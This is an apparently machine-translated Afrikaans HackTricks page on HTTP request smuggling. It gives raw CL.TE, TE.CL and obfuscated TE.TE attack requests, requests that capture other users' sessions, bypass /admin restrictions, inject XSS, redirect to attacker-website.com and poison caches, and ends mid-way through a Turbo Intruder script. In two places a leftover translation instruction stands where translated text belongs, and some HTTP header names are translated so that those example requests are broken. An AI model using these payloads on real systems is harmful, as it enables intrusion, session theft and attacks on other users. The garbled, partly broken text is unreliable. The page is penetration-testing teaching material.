# HTTP Aanvraag Smokkelary / HTTP Desync Aanval

<details>

<summary><strong>Leer AWS hak van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Wat is

Hierdie kwesbaarheid kom voor wanneer 'n **desinkronisasie** tussen **front-end proksies** en die **agterste** bediener 'n **aanvaller** toelaat om 'n HTTP **aanvraag** te **stuur** wat deur die **front-end** proksies (laaibalansering/omgekeerde proksie) as 'n **enkele aanvraag** en deur die **agterste** bediener as **2 aanvrae** ge√Ønterpreteer sal word.\
Dit stel 'n gebruiker in staat om die volgende aanvraag wat na die agterste bediener kom na hom te **verander**.

### Teorie

[**RFC Spesifikasie (2161)**](https://tools.ietf.org/html/rfc2616)

> As 'n boodskap ontvang word met beide 'n Oorplasing-Kodering koperveld en 'n Inhouds-Lengte koperveld, moet die laasgenoemde ge√Øgnoreer word.

**Inhouds-Lengte**

> Die Inhouds-Lengte entiteitkop dui die grootte van die entiteitliggaam, in bytes, aan wat aan die ontvanger gestuur word.

**Oorplasing-Kodering: stuksgewys**

> Die Oorplasing-Kodering kop spesifiseer die vorm van kodering wat gebruik word om die nutliggaam veilig na die gebruiker oor te dra.\
> Stuksgewys beteken dat groot data in 'n reeks stukke gestuur word.

### Werklikheid

Die **Front-End** ( 'n laaibalansering / Omgekeerde Proksie) **verwerk** die _**inhouds-lengte**_ of die _**oorplasing-kodering**_ kop en die **Agterste** bediener **verwerk die ander** een wat 'n **desinkronisasie** tussen die 2 stelsels veroorsaak.\
Dit kan baie krities wees omdat **'n aanvaller in staat sal wees om een aanvraag** na die omgekeerde proksie te stuur wat deur die **agterste** bediener as **2 verskillende aanvrae ge√Ønterpreteer** sal word. Die **gevaar** van hierdie tegniek l√™ daarin dat die **agterste** bediener die **2de ingeslote aanvraag** sal **interpreteer** asof dit van die volgende kli√´nt afkomstig is en die **werklike aanvraag** van daardie kli√´nt sal deel wees van die **ingeslote aanvraag**.

### Besonderhede

Onthou dat in HTTP **'n nuwe lynkarakter uit 2 byte bestaan:**

* **Inhouds-Lengte**: Hierdie kop gebruik 'n **desimale nommer** om die **aantal** **bytes** van die **liggaam** van die aanvraag aan te dui. Daar word verwag dat die liggaam eindig met die laaste karakter, **'n nuwe lyn is nie nodig aan die einde van die aanvraag** nie.
* **Oorplasing-Kodering:** Hierdie kop gebruik in die **liggaam** 'n **heksadesimale nommer** om die **aantal** **bytes** van die **volgende stuk** aan te dui. Die **stuk** moet eindig met 'n **nuwe lyn** maar hierdie nuwe lyn **word nie getel** deur die lengte-aanwyser nie. Hierdie oorplasingsmetode moet eindig met 'n **stuk van grootte 0 gevolg deur 2 nuwe lyne**: `0`
* **Verbinding**: Gebaseer op my ervaring word dit aanbeveel om **`Verbinding: hou aan die lewe`** te gebruik op die eerste aanvraag van die aanvraag Smokkelary.

## Basiese Voorbeelde

{% hint style="success" %}
Wanneer jy probeer om hierdie met Burp Suite te benut, **deaktiveer `Werk Inhouds-Lengte by` en `Normaliseer HTTP/1 lyn-eindes`** in die herhaler omdat sommige toestelle nuwe lyne, karretjies en gebrekkige inhoudslengtes misbruik.
{% endhint %}

HTTP aanvraag smokkelary aanvalle word saamgestel deur dubbelsinnige aanvrae te stuur wat diskrepansies uitbuit in hoe front-end en agterste bedieners die `Inhouds-Lengte` (CL) en `Oorplasing-Kodering` (TE) koppe interpreteer. Hierdie aanvalle kan in verskillende vorme voorkom, hoofsaaklik as **CL.TE**, **TE.CL**, en **TE.TE**. Elke tipe verteenwoordig 'n unieke kombinasie van hoe die front-end en agterste bedieners hierdie koppe prioritiseer. Die kwesbaarhede ontstaan as gevolg van die bedieners wat dieselfde aanvraag op verskillende maniere verwerk, wat lei tot onverwagte en potensieel skadelike uitkomste.

### Basiese Voorbeelde van Kwesbaarheidstipes

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

#### CL.TE Kwesbaarheid (Inhouds-Lengte gebruik deur Front-End, Oorplasing-Kodering gebruik deur Agter-End)

* **Front-End (CL):** Verwerk die aanvraag op grond van die `Inhouds-Lengte` kop.
* **Agter-End (TE):** Verwerk die aanvraag op grond van die `Oorplasing-Kodering` kop.
* **Aanvalscenario:**
* Die aanvaller stuur 'n aanvraag waar die waarde van die `Inhouds-Lengte` kop nie ooreenstem met die werklike inhoudslengte nie.
* Die front-end bediener stuur die hele aanvraag na die agter-end, gebaseer op die `Inhouds-Lengte` waarde.
* Die agter-end bediener verwerk die aanvraag as stuksgewys weens die `Oorplasing-Kodering: stuksgewys` kop, wat die oorblywende data interpreteer as 'n aparte, daaropvolgende aanvraag.
*   **Voorbeeld:**

```
POST / HTTP/1.1
Host: kwesbare-webwerf.com
Inhouds-Lengte: 30
Verbinding: hou aan die lewe
Oorplasing-Kodering: stuksgewys

0

GET /404 HTTP/1.1
Foo: x
```

#### TE.CL Kwesbaarheid (Oorplasing-Kodering gebruik deur Front-End, Inhouds-Lengte gebruik deur Agter-End)

* **Front-End (TE):** Verwerk die aanvraag op grond van die `Oorplasing-Kodering` kop.
* **Agter-End (CL):** Verwerk die aanvraag op grond van die `Inhouds-Lengte` kop.
* **Aanvalscenario:**
* Die aanvaller stuur 'n stuksgewyse aanvraag waar die stukgrootte (`7b`) en werklike inhoudslengte (`Inhouds-Lengte: 4`) nie ooreenstem nie.
* Die front-end bediener, ter wille van `Oorplasing-Kodering`, stuur die hele aanvraag na die agter-end.
* Die agter-end bediener, met inagneming van `Inhouds-Lengte`, verwerk slegs die aanvanklike deel van die aanvraag (`7b` byte), wat die res as deel van 'n onbedoelde daaropvolgende aanvraag los.
*   **Voorbeeld:**

```
POST / HTTP/1.1
Host: kwesbare-webwerf.com
Inhouds-Lengte: 4
Verbinding: hou aan die lewe
Oorplasing-Kodering: stuksgewys

7b
GET /404 HTTP/1.1
Host: kwesbare-webwerf.com
Inhouds-Tipe: aansoek/x-www-form-urlencoded
Inhouds-Lengte: 30

x=
0

```
#### TE.TE Kwesbaarheid (Oordrag-Kodering gebruik deur beide, met verduistering)

* **Bedieners:** Beide ondersteun `Oordrag-Kodering`, maar een kan bedrieg word om dit te ignoreer deur verduistering.
* **Aanvalscenario:**
* Die aanvaller stuur 'n versoek met verduisterde `Oordrag-Kodering`-koppe.
* Afhangend van watter bediener (voorste of agterste) nie die verduistering herken nie, kan 'n CL.TE of TE.CL kwesbaarheid uitgebuit word.
* Die onverwerkte deel van die versoek, soos deur een van die bedieners gesien, word deel van 'n daaropvolgende versoek, wat tot smokkelary lei.
*   **Voorbeeld:**

```
POST / HTTP/1.1
Host: kwesbare-webwerf.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **CL.CL Scenario (Inhouds-Lengte gebruik deur beide Voorste en Agterste):**

* Beide bedieners verwerk die versoek uitsluitlik op grond van die `Inhouds-Lengte`-kop.
* Hierdie scenario lei tipies nie tot smokkelary nie, aangesien daar ooreenstemming is oor hoe beide bedieners die versoeklengte interpreteer.
*   **Voorbeeld:**

```
POST / HTTP/1.1
Host: kwesbare-webwerf.com
Content-Length: 16
Connection: keep-alive

Normale Versoek
```

#### **CL != 0 Scenario:**

* Verwys na scenario's waar die `Inhouds-Lengte`-kop teenwoordig is en 'n waarde anders as nul het, wat aandui dat die versoekliggaam inhoud het.
* Dit is noodsaaklik om smokkelary-aanvalle te verstaan en te skep, aangesien dit be√Ønvloed hoe bedieners die einde van 'n versoek bepaal.
*   **Voorbeeld:**

```
POST / HTTP/1.1
Host: kwesbare-webwerf.com
Content-Length: 16
Connection: keep-alive

Nie-Le√´ Liggaam
```

#### Dwang deur hop-vir-hop-koppe

Deur hop-vir-hop-koppe te misbruik, kan jy die proksi aandui om **die kop Inhouds-Lengte of Oordrag-Kodering te verwyder sodat 'n HTTP-versoeksmokkelary moontlik is om misbruik te word**.
```
Connection: Content-Length
```
Vir **meer inligting oor hop-by-hop koppe** besoek:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## Die Identifisering van HTTP-aanvraagsmokkel

Die identifisering van HTTP-aanvraagsmokkel kwesbaarhede kan dikwels bereik word deur gebruik te maak van tydtegnieke, wat afhang van die waarneming van hoe lank dit neem vir die bediener om te reageer op gemanipuleerde aanvrae. Hierdie tegnieke is veral nuttig vir die opsporing van CL.TE en TE.CL kwesbaarhede. Benewens hierdie metodes is daar ander strategie√´ en gereedskap wat gebruik kan word om sulke kwesbaarhede te vind:

### Die Identifisering van CL.TE Kwesbaarhede deur Tydtegnieke te Gebruik

* **Metode:**
* Stuur 'n aanvraag wat, as die toepassing kwesbaar is, die agterste bediener sal laat wag vir addisionele data.
*   **Voorbeeld:**

```
POST / HTTP/1.1
Host: kwesbare-webwerf.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
* **Waarneming:**
* Die voorste bediener verwerk die aanvraag op grond van `Content-Length` en sny die boodskap vroegtydig af.
* Die agterste bediener, wat 'n gechunke boodskap verwag, wag vir die volgende gechunke wat nooit aankom nie, wat 'n vertraging veroorsaak.
* **Aanwysers:**
* Time-outs of lang vertragings in respons.
* Ontvang 'n 400 Bad Request fout van die agterste bediener, soms met gedetailleerde bedienerinligting.

### Die Identifisering van TE.CL Kwesbaarhede deur Tydtegnieke te Gebruik

* **Metode:**
* Stuur 'n aanvraag wat, as die toepassing kwesbaar is, die agterste bediener sal laat wag vir addisionele data.
*   **Voorbeeld:**

```
POST / HTTP/1.1
Host: kwesbare-webwerf.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
* **Waarneming:**
* Die voorste bediener verwerk die aanvraag op grond van `Transfer-Encoding` en stuur die hele boodskap voort.
* Die agterste bediener, wat 'n boodskap verwag op grond van `Content-Length`, wag vir addisionele data wat nooit aankom nie, wat 'n vertraging veroorsaak.

### Ander Metodes om Kwesbaarhede te Vind

* **Differensi√´le Responsanalise:**
* Stuur effens gevarieerde weergawes van 'n aanvraag en neem waar of die bedienerresponsies op 'n onverwagte manier verskil, wat op 'n parsingsdiskrepansie dui.
* **Die Gebruik van Geoutomatiseerde Gereedskap:**
* Gereedskap soos Burp Suite se 'HTTP Request Smuggler' uitbreiding kan outomaties toets vir hierdie kwesbaarhede deur verskeie vorme van dubbelsinnige aanvrae te stuur en die responsies te analiseer.
* **Content-Length Variansietoetse:**
* Stuur aanvrae met wisselende `Content-Length` waardes wat nie ooreenstem met die werklike inhoudslengte nie en neem waar hoe die bediener sulke wanpassings hanteer.
* **Transfer-Encoding Variansietoetse:**
* Stuur aanvrae met geobskureerde of verkeerd geformuleerde `Transfer-Encoding` koppe en monitor hoe anders die voorste en agterste bedieners reageer op sulke manipulasies.

### Toetsing van HTTP-aanvraagsmokkelkwesbaarhede

Nadat die doeltreffendheid van tydtegnieke bevestig is, is dit noodsaaklik om te verifieer of kli√´ntaanvrae gemanipuleer kan word. 'n Eenvoudige metode is om jou aanvrae te probeer vergiftig, byvoorbeeld deur 'n aanvraag na `/` te maak wat 'n 404 respons veroorsaak. Die `CL.TE` en `TE.CL` voorbeelde wat vroe√´r bespreek is in [Basiese Voorbeelde](./#basiese-voorbeelde) demonstreer hoe om 'n kli√´nt se aanvraag te vergiftig om 'n 404 respons uit te lok, ten spyte van die kli√´nt wat probeer om toegang te verkry tot 'n ander hulpbron.

**Belangrike Oorwegings**

Wanneer jy toets vir aanvraagsmokkelkwesbaarhede deur inmenging met ander aanvrae, moet jy in gedagte hou:

* **Duidelike Netwerkverbindings:** Die "aanval" en "normale" aanvrae moet oor afsonderlike netwerkverbindings gestuur word. Die gebruik van dieselfde verbinding vir beide valideer nie die teenwoordigheid van die kwesbaarheid nie.
* **Konstante URL en Parameters:** Mik daarop om identiese URL's en parametername vir beide aanvrae te gebruik. Moderne toepassings roeteer dikwels aanvrae na spesifieke agterste bedieners op grond van URL en parameters. Om dit te laat ooreenstem, verhoog die waarskynlikheid dat beide aanvrae deur dieselfde bediener verwerk word, 'n voorvereiste vir 'n suksesvolle aanval.
* **Tyd en Wedrenomstandighede:** Die "normale" aanvraag, bedoel om inmenging van die "aanval" aanvraag te ontdek, kompeteer teen ander gelyktydige toepassingsaanvrae. Stuur dus die "normale" aanvraag onmiddellik na die "aanval" aanvraag. Besige toepassings mag verskeie pogings vereis vir 'n oortuigende bevestiging van die kwesbaarheid.
* **Lasbalanseringsuitdagings:** Voorste bedieners wat as lasbalanserings optree, kan aanvrae oor verskeie agterste stelsels versprei. As die "aanval" en "normale" aanvrae op verskillende stelsels beland, sal die aanval nie slaag nie. Hierdie aspek van lasbalansering mag verskeie pogings vereis om 'n kwesbaarheid te bevestig.
* **Onbedoelde Gebruikerimpak:** As jou aanval onbedoeld 'n impak het op 'n ander gebruiker se aanvraag (nie die "normale" aanvraag wat jy gestuur het vir opsporing nie), dui dit daarop dat jou aanval 'n invloed gehad het op 'n ander toepassingsgebruiker. Aanhoudende toetsing kan ander gebruikers ontwrig, wat 'n versigtige benadering vereis.

## Misbruik van HTTP-aanvraagsmokkel

### Om voorste-end-sekuriteitsbeheer te omseil

### Omseiling van Voorste-End-Sekuriteit via HTTP-aanvraagsmokkel

Soms dwing voorste-end-proksi sekerheidsmaatre√´ls af deur inkomende aanvrae te ondersoek. Nietemin kan hierdie maatre√´ls omseil word deur HTTP-aanvraagsmokkel te benut, wat ongemagtigde toegang tot beperkte eindpunte moontlik maak. Byvoorbeeld, toegang tot `/admin` mag ekstern verbied word, met die voorste-end-proksi wat sulke pogings aktief blokkeer. Nietemin mag hierdie proksi versuim om ingeslote aanvrae binne 'n gesmokkelde HTTP-aanvraag te ondersoek, wat 'n gaping laat vir die omseiling van hierdie beperkings.

Oorweeg die volgende voorbeelde wat illustreer hoe HTTP-aanvraagsmokkel gebruik kan word om voorste-end-sekuriteitsbeheer te omseil, spesifiek met die mikpunt op die `/admin` pad wat tipies bewaak word deur die voorste-end-proksi:

**CL.TE Voorbeeld**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
In die CL.TE-aanval word die `Content-Length`-kop gekapitaliseer vir die aanvanklike versoek, terwyl die daaropvolgende ingeslote versoek die `Transfer-Encoding: chunked`-kop gebruik. Die front-end proksi verwerk die aanvanklike `POST`-versoek, maar misluk om die ingeslote `GET /admin`-versoek te inspekteer, wat ongemagtigde toegang tot die `/admin`-roete moontlik maak.

**TE.CL Voorbeeld**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Omgekeerd, in die TE.CL-aanval, gebruik die aanvanklike `POST`-versoek `Transfer-Encoding: chunked`, en die daaropvolgende ingeslote versoek word verwerk op grond van die `Content-Length`-kop. Soortgelyk aan die CL.TE-aanval, ignoreer die front-end-proksi die gesmokkelde `GET /admin`-versoek, wat onbedoeld toegang verleen tot die beperkte `/admin`-roete.

### Onthulling van front-end versoek herskrywing <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Toepassings maak dikwels gebruik van 'n **front-end bediener** om inkomende versoeke te wysig voordat dit na die agterste bediener gestuur word. 'n Tipiese wysiging behels die byvoeging van koppe, soos `X-Forwarded-For: <IP van die klient>`, om die klient se IP na die agterste te stuur. Die begrip van hierdie wysigings kan krities wees, aangesien dit moontlik maniere kan onthul om **beskermings te omseil** of **verskuilde inligting of eindpunte te ontbloot**.

Om te ondersoek hoe 'n proksi 'n versoek verander, vind 'n POST-parameter wat die agterste in die antwoord herhaal. Stel dan 'n versoek op, waarin hierdie parameter laaste gebruik word, soortgelyk aan die volgende:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
In hierdie struktuur word daaropvolgende versoekkomponente bygevoeg na `search=`, wat die parameter is wat in die respons weerspie√´l word. Hierdie weerspie√´ling sal die koppe van die daaropvolgende versoek blootstel.

Dit is belangrik om die `Content-Length`-kop van die geneste versoek te belyn met die werklike inhoudslengte. Dit is aan te beveel om met 'n klein waarde te begin en geleidelik te verhoog, aangesien 'n te lae waarde die weerspie√´lde data kan afkap, terwyl 'n te ho√´ waarde die versoek kan laat misluk.

Hierdie tegniek is ook toepaslik in die konteks van 'n TE.CL-skwetsbaarheid, maar die versoek moet eindig met `search=\r\n0`. Ongeag die nuwe lynkarakters, sal die waardes aan die soekparameter aangeheg word.

Hierdie metode dien hoofsaaklik om die versoekmodifikasies wat deur die front-end proksi gedoen word, te verstaan, en voer in wese 'n selfgerigte ondersoek uit.

### Vaslegging van ander gebruikers se versoek <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Dit is moontlik om die versoek van die volgende gebruiker vas te l√™ deur 'n spesifieke versoek as die waarde van 'n parameter tydens 'n POST-operasie by te voeg. Hier is hoe dit gedoen kan word:

Deur die volgende versoek as die waarde van 'n parameter by te voeg, kan jy die daaropvolgende klient se versoek stoor:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
In hierdie scenario is die **kommentaarparameter** bedoel om die inhoud binne 'n pos se kommentaarafdeling op 'n openlik toeganklike bladsy te stoor. Gevolglik sal die inhoud van die volgende versoek as 'n kommentaar verskyn.

Hierdie tegniek het egter beperkinge. Dit vang gewoonlik slegs data op tot by die parametergrens wat in die gesmokkelde versoek gebruik word. Vir URL-gekodeerde vormindiening is hierdie grens die `&` karakter. Dit beteken dat die opgevangde inhoud van die slagoffer se versoek sal stop by die eerste `&`, wat selfs deel van die vraagstring kan wees.

Daarbenewens is dit die moeite werd om op te let dat hierdie benadering ook lewensvatbaar is met 'n TE.CL kwesbaarheid. In sulke gevalle moet die versoek eindig met `search=\r\n0`. Ongeag nuwe lynkarakters sal die waardes aan die soekparameter geheg word.

### Gebruik van HTTP-versoeksmokkeling om weerspie√´lde XSS uit te buit

HTTP-versoeksmokkeling kan gebruik word om webbladsye wat vatbaar is vir **Weerspie√´lde XSS** uit te buit, met aansienlike voordele:

* Interaksie met die teikengebruikers is **nie vereis nie**.
* Maak die uitbuiting van XSS moontlik in dele van die versoek wat normaalweg **onbereikbaar** is, soos HTTP-versoekkoppe.

In scenario's waar 'n webwerf vatbaar is vir Weerspie√´lde XSS deur die Gebruiker-Agent kop, demonstreer die volgende lading hoe om hierdie kwesbaarheid uit te buit:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Hierdie lading is gestruktureer om die kwesbaarheid te benut deur:

1. 'n `POST` versoek te inisieer, ogenschijnlik tipies, met 'n `Transfer-Encoding: chunked` kop om die begin van smokkelary aan te dui.
2. Gevolg deur 'n `0`, wat die einde van die gechunke boodskapl aandui.
3. Dan word 'n gesmokkelde `GET` versoek ingevoer, waar die `User-Agent` kop ge√Ønjecteer word met 'n skripsie, `<script>alert(1)</script>`, wat die XSS trigger wanneer die bediener hierdie daaropvolgende versoek verwerk.

Deur die `User-Agent` te manipuleer deur smokkelary, omseil die lading normale versoekbeperkings en benut sodoende die Reflected XSS kwesbaarheid op 'n nie-standaard maar effektiewe wyse.

### Gebruik van HTTP-versoeksmokkelary om 'n aanlynverwysing in 'n oop verwysing te omskep <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

### Uitbuiting van aanlynverwysings met HTTP-versoeksmokkelary <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Toepassings verwys dikwels van die een URL na die ander deur die gasheernaam van die `Host` kop in die verwysings-URL te gebruik. Dit is algemeen met webbedieners soos Apache en IIS. Byvoorbeeld, 'n versoek om 'n vouer sonder 'n afsluitende skuiwe te maak, lei tot 'n verwysing om die skuiwe in te sluit:
```
GET /home HTTP/1.1
Host: normal-website.com
```
### Resultate:

Die volgende is inhoud uit 'n hakboek oor hak tegnieke. Die volgende inhoud is uit die l√™er pentesting-web/http-request-smuggling/README.md. Vertaal die relevante Engelse teks na Afrikaans en gee die vertaling terug met behoud van dieselfde markdown- en html-sintaks. Moet nie dinge soos kode, hak tegniekname, hakwoorde, wolk/SaaS-platformname (soos Workspace, aws, gcp...), die woord 'lek', pentesting, en markdown-etikette vertaal nie. Moet ook nie enige ekstra goed byvoeg buite die vertaling en markdown-sintaks nie.
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Alhoewel dit op die oog af onskadelik lyk, kan hierdie gedrag gemanipuleer word deur gebruik te maak van HTTP-aanvraagsmokkelary om gebruikers na 'n eksterne webwerf om te lei. Byvoorbeeld:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Hierdie gesmokkelde versoek kan veroorsaak dat die volgende verwerkte gebruikersversoek na 'n aanvallerbeheerde webwerf omgelei word:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
### Resultate:

Die volgende is inhoud uit 'n hakboek oor hak tegnieke. Die volgende inhoud is uit die l√™er pentesting-web/http-request-smuggling/README.md. Vertaal die relevante Engelse teks na Afrikaans en gee die vertaling terug met presies dieselfde markdown- en html-sintaks. Moet nie dinge soos kode, hak tegniek name, hak woord, wolk/SaaS platform name (soos Workspace, aws, gcp...), die woord 'leak', pentesting, en markdown-etikette vertaal nie. Moet ook nie enige ekstra goed byvoeg buite die vertaling en markdown-sintaks nie.
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
In hierdie scenario word 'n gebruiker se versoek vir 'n JavaScript-l√™er gekaap. Die aanvaller kan potensieel die gebruiker compromitteer deur kwaadwillige JavaScript as reaksie te dien.

### Die gebruik van HTTP-versoeksmokkelary om webgeheuevergiftiging uit te voer <a href="#using-http-request-smuggling-to-perform-web-cache-poisoning" id="using-http-request-smuggling-to-perform-web-cache-poisoning"></a>

### Uitbuiting van Webgeheuevergiftiging via HTTP-versoeksmokkelary <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Webgeheuevergiftiging kan uitgevoer word as enige komponent van die **front-end infrastruktuur inhoud in die geheue stoor**, tipies om prestasie te verbeter. Deur die server se reaksie te manipuleer, is dit moontlik om die **geheue te vergiftig**.

Vroe√´r het ons waargeneem hoe serverreaksies verander kan word om 'n 404-fout terug te gee (sien [Basiese Voorbeelde](./#basic-examples)). Op soortgelyke wyse is dit moontlik om die server te mislei om `/index.html`-inhoud te lewer as reaksie op 'n versoek vir `/static/include.js`. Gevolglik word die inhoud van `/static/include.js` in die geheue vervang met di√© van `/index.html`, wat `/static/include.js` ontoeganklik maak vir gebruikers, moontlik leiend tot 'n Diensverleningsontkenning (DoS).

Hierdie tegniek word veral kragtig as 'n **Oop Aanstuurbaarheidskwesbaarheid** ontdek word of as daar 'n **aanstuur na 'n oop aanstuurbaarheid op die webwerf** is. Sulke kwesbaarhede kan uitgebuit word om die gekaapte inhoud van `/static/include.js` met 'n skrip onder die beheer van die aanvaller te vervang, wat essensieel 'n wye Kruissite-skripsing (XSS) aanval teen alle kli√´nte wat die opgedateerde `/static/include.js` versoek, moontlik maak.

Hieronder is 'n illustrasie van die uitbuiting van **geheuevergiftiging gekombineer met 'n aanstuur na 'n oop aanstuurbaarheid op die webwerf**. Die doel is om die geheue-inhoud van `/static/include.js` te verander om JavaScript-kode wat deur die aanvaller beheer word, te dien:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Merk die ingeslote versoek wat mik op `/post/next?postId=3`. Hierdie versoek sal na `/post?postId=4` omgelei word, deur die **Host-kopwaarde** te gebruik om die domein te bepaal. Deur die **Host-kop** te verander, kan die aanvaller die versoek na hul domein omlei (**op-webwerf-omleiding na oop omleiding**).

Na suksesvolle **socket-vergiftiging** moet 'n **GET-versoek** vir `/static/include.js` ge√Ønisieer word. Hierdie versoek sal besmet word deur die vorige **op-webwerf-omleiding na oop omleiding** versoek en die inhoud van die skrip wat deur die aanvaller beheer word, oplaai.

Daarna sal enige versoek vir `/static/include.js` die gekaapte inhoud van die aanvaller se skrip dien, wat effektief 'n bre√´ XSS-aanval lanceer.

### Gebruik van HTTP-versoeksmokkelary om webgeknoei te pleeg <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Wat is die verskil tussen webgeknoei en webgeknoei?**
>
> * In **webgeknoei**, veroorsaak die aanvaller dat die aansoek 'n paar skadelike inhoud in die cache stoor, en hierdie inhoud word vanuit die cache aan ander aansoekgebruikers bedien.
> * In **webgeknoei**, veroorsaak die aanvaller dat die aansoek 'n paar sensitiewe inhoud van 'n ander gebruiker in die cache stoor, en die aanvaller haal dan hierdie inhoud uit die cache.

Die aanvaller stel 'n gesmokkelde versoek op wat sensitiewe gebruikerspesifieke inhoud oplaai. Oorweeg die volgende voorbeeld:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
Indien hierdie gesmokkelde versoek 'n cache-invoer vergiftig wat bedoel is vir statiese inhoud (bv. `/someimage.png`), kan die slagoffer se sensitiewe data van `/private/messages` onder die cache-invoer van die statiese inhoud gekas word. Gevolglik kan die aanvaller moontlik hierdie gekas sensitiewe data terugwin.

### Bewapening van HTTP Versoek Smokkel met HTTP Respons Desinchronisering

Het jy 'n HTTP Versoek Smokkel kwesbaarheid gevind en weet nie hoe om dit te benut nie. Probeer hierdie ander metode van uitbuiting:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## Turbo indringer skripte

### CL.TE

Van [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

